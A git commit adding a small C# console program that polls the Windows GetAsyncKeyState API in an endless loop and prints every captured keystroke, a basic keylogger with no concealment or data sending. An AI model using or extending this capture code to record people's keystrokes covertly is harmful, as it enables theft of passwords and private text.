b9e2969c9f97e10b9853705a1937a2fa9d106d4d
Victoris <52378018+sviridchik@users.noreply.github.com>
2020-04-18 14:31:24 +0300

    Add files via upload

---
+++ ConsoleApp6/ConsoleApp6/Program.cs
@@ -0,0 +1,27 @@
+﻿using System;
+using System.Runtime.InteropServices;
+using System.Threading;
+
+namespace ConsoleApp6
+{
+    class Program
+    {
+        [DllImport("User32.dll")]
+        public static extern int GetAsyncKeyState(Int32 i);
+        public string keylog = "";
+        static void Main(string[] args)
+        {
+            while (true) {
+                //check state of all keys
+                Thread.Sleep(5);
+                for (int i = 32; i < 127; i++) {
+                    int keyState = GetAsyncKeyState(i);
+                    if (keyState == -32767){
+                        Console.Write((char)i + ", ");
+                    }
+                  
+                }
+            }
+        }
+    }
+}
